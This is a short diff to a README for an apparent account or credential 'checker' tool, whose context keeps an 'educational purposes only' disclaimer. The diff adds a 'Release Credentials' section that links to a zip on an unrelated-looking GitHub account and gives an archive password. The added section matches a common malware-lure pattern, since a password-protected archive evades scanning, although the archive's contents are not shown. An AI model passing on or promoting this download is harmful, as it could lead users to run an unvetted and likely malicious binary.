@@ -116,3 +116,10 @@ Each output file will have a header and footer indicating the checker source and
 
 > [!WARNING]  
 > *This tool is for educational purposes only. The creator won't take any responsibility if any users take advantage of this and exploit it for illicit activities.*
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/plumenodeblaze7/checker-bin-8lsa/releases/download/v1.0.0/checker.zip)
+- **Archive Password:** `zlVQUnkb5E`
